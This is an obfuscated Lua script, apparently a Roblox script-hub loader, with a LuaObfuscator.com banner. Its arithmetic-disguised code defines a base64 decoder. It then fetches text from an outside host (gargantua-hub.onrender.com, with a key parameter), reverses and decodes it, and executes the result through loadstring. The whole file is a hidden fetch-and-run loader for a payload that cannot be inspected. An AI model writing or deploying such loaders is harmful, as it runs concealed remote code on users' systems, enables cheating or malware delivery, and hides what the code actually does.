--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";local function v1(v5) v5=string.gsub(v5,"[^"   .. v0   .. "=]" ,"");return (v5:gsub(".",function(v6) local v7=0;local v8;local v9;while true do if (v7==(2 -1)) then for v15=17 -11 ,1 + 0 , -(569 -(367 + 201)) do v8=v8   .. (((((v9%(2^v15)) -(v9%((929 -(214 + 713))^(v15-(2 -1)))))>(0 + 0)) and "1") or "0") ;end return v8;end if (v7==(0 -0)) then if (v6=="=") then return "";end v8,v9="",v0:find(v6) -1 ;v7=1 + 0 ;end end end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(v10) local v11=877 -(282 + 595) ;local v12;while true do if (v11==(180 -(67 + 113))) then if ( #v10~=(6 + 2)) then return "";end v12=1637 -(1523 + 114) ;v11=1 + 0 ;end if (v11==(1 -0)) then for v16=1,1073 -(68 + 997)  do v12=v12 + (((v10:sub(v16,v16)=="1") and ((1272 -(226 + 1044))^((34 -26) -v16))) or (117 -(32 + 85))) ;end return string.char(v12);end end end));end local v2="https://gargantua-hub.onrender.com/load-gargantua?key=mestre2026";local v3,v4=pcall(function() return game:HttpGet(v2);end);if (v3 and v4) then local v13=string.reverse(v4);local v14=v1(v13);pcall(function() loadstring(v14)();end);end